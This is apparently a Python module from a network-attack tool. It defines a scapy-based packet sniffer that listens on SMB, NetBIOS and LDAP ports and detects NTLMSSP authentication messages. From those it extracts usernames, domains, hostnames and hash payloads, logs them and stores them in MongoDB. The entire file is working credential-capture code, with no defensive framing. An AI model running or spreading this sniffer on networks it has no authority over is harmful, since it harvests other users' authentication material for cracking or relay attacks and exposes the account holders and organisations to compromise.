import logging
import socket
import struct
import threading
import platform
from datetime import datetime
from typing import Optional, Dict, Any

from scapy.all import sniff, IP, UDP, TCP, Raw
from src.utils.mongo_handler import MongoDBHandler
from src.modules.storage.models import NTLMCapture
from src.utils.hash_handler import parse_hashes


class PacketSniffer:
    def __init__(self, interface: str = None):
        self.logger = logging.getLogger(__name__)
        self.interface = self._get_interface_name(interface)
        self.running = False
        self.capture_thread: Optional[threading.Thread] = None

        # Initialize MongoDB only
        try:
            self.mongo_handler = MongoDBHandler()
            self.logger.info("MongoDB connection established")
        except Exception as e:
            self.logger.error(f"Failed to connect to MongoDB: {e}")
            raise

        self.ntlm_sessions = {}  # Track NTLM sessions

    def _get_interface_name(self, interface: str) -> str:
        """Get the correct interface name for the current platform"""
        if not interface:
            raise ValueError("Network interface name is required")

        try:
            if platform.system() == 'Windows':
                # Import only on Windows
                from scapy.arch import get_windows_if_list
                interfaces = get_windows_if_list()
                for iface in interfaces:
                    if interface.lower() in iface['name'].lower() or interface.lower() in iface['description'].lower():
                        self.logger.info(f"Found matching interface: {iface['name']} ({iface['description']})")
                        return iface['name']

                available = "\n".join([f"- {i['name']} ({i['description']})" for i in interfaces])
                raise ValueError(f"Interface '{interface}' not found.\nAvailable interfaces:\n{available}")
            else:
                # For non-Windows systems, assume the provided name is correct
                # You might want to add validation here using platform-specific tools if needed
                self.logger.info(f"Using provided interface name for non-Windows system: {interface}")
                return interface
        except ImportError:
             self.logger.error("Failed to import Windows-specific module on a non-Windows system. This might indicate an issue.")
             # Fallback for non-windows if import somehow fails elsewhere
             return interface
        except Exception as e:
            self.logger.error(f"Error finding interface: {e}")
            if platform.system() == 'Windows' and "Npcap is not installed" in str(e):
                self.logger.error("Please install Npcap from https://npcap.com/")
            raise

    def start(self):
        """Start packet capture in a separate thread"""
        try:
            self.running = True
            self.capture_thread = threading.Thread(target=self._capture_packets)
            self.capture_thread.daemon = True
            self.capture_thread.start()
            self.logger.info(f"Packet capture started on interface {self.interface}")
        except Exception as e:
            self.logger.error(f"Failed to start capture: {e}")
            raise

    def stop(self):
        """Stop the packet capture"""
        self.running = False
        if self.capture_thread:
            self.capture_thread.join()
        if hasattr(self, 'mongo_handler') and self.mongo_handler:
            self.mongo_handler.disconnect()
        self.logger.info("Packet capture stopped")

    def _capture_packets(self):
        """Capture packets using scapy"""
        try:
            # Updated filter to capture more NTLM-related traffic
            sniff(
                iface=self.interface,
                # Added ports 137, 138 for NetBIOS and port 389 for LDAP
                filter="tcp port 445 or tcp port 139 or udp port 137 or udp port 138 or tcp port 389",
                prn=self._packet_callback,
                store=0,
                stop_filter=lambda _: not self.running
            )
        except Exception as e:
            self.logger.error(f"Error in packet capture: {e}")
            self.running = False

    def _packet_callback(self, packet):
        """Process captured packets"""
        if IP in packet:
            try:
                # Check for both TCP and UDP packets
                if (TCP in packet or UDP in packet) and hasattr(packet.payload.payload, 'load'):
                    payload_data = bytes(packet.payload.payload.load)

                    # Look for NTLM authentication packets
                    if self._is_ntlm_auth(packet):
                        ntlm_data = self._extract_ntlm_data(packet)
                        if ntlm_data:
                            # Parse the NTLM data
                            parsed_hashes = parse_hashes(ntlm_data)
                            for hash_info in parsed_hashes:
                                if hash_info.get('complete_hash'):
                                    self._store_hash(hash_info)
                                    self.logger.info(f"Captured NTLM hash from {packet[IP].src} -> {packet[IP].dst}")

                                # Enhanced logging for authentication attempts
                                msg_type = hash_info.get('type')
                                if msg_type == 1:
                                    self.logger.info(f"[+] NTLM Negotiate from {packet[IP].src}")
                                elif msg_type == 2:
                                    self.logger.info(f"[+] NTLM Challenge from {packet[IP].src}")
                                elif msg_type == 3:
                                    self.logger.info(f"[+] NTLM Authentication attempt from {packet[IP].src}")
                                    if hash_info.get('username'):
                                        self.logger.info(f"    Username: {hash_info['username']}")
                                    if hash_info.get('domain'):
                                        self.logger.info(f"    Domain: {hash_info['domain']}")
                                    if hash_info.get('hostname'):
                                        self.logger.info(f"    Hostname: {hash_info['hostname']}")
                                    self.logger.info("-" * 50)

                            return ntlm_data
            except Exception as e:
                self.logger.error(f"Error processing packet: {e}")
        return None

    def _store_hash(self, hash_info: Dict):
        """Store captured hash information in database"""
        try:
            # Try MongoDB first if available
            if hasattr(self, 'mongo_handler') and self.mongo_handler:
                try:
                    capture_id = self.mongo_handler.store_capture({
                        'source': hash_info['source'],
                        'destination': hash_info['destination'],
                        'username': hash_info.get('username'),
                        'domain': hash_info.get('domain'),
                        'hostname': hash_info.get('hostname'),
                        'ntlm_type': hash_info.get('type'),
                        'payload': hash_info['payload']
                    })
                    if capture_id:
                        self.logger.info("Successfully stored capture in MongoDB")
                        return
                except Exception as e:
                    self.logger.error(f"MongoDB storage failed: {e}")

        except Exception as e:
            self.logger.error(f"Error storing hash: {e}")

    def _is_ntlm_auth(self, packet) -> bool:
        """Check if packet contains NTLM authentication"""
        try:
            if TCP in packet:
                payload = bytes(packet[TCP].payload)
            elif UDP in packet:
                payload = bytes(packet[UDP].payload)
            else:
                return False

            return (b'NTLMSSP' in payload and
                   (b'NTLMSSP\x00\x01\x00\x00\x00' in payload or  # Type 1
                    b'NTLMSSP\x00\x02\x00\x00\x00' in payload or  # Type 2
                    b'NTLMSSP\x00\x03\x00\x00\x00' in payload))   # Type 3
        except:
            return False

    def _extract_ntlm_data(self, packet) -> Optional[Dict]:
        """Extract NTLM authentication data from packet"""
        try:
            if TCP in packet:
                payload = bytes(packet[TCP].payload)
            elif UDP in packet:
                payload = bytes(packet[UDP].payload)
            else:
                return None

            if b'NTLMSSP' in payload:
                return {
                    'source': packet[IP].src,
                    'destination': packet[IP].dst,
                    'payload': payload.hex()
                }
        except Exception as e:
            self.logger.error(f"Error extracting NTLM data: {e}")
        return None


def start_capture(interface: str = None) -> PacketSniffer:
    """Start packet capture and return the sniffer instance"""
    sniffer = PacketSniffer(interface)
    sniffer.start()
    return sniffer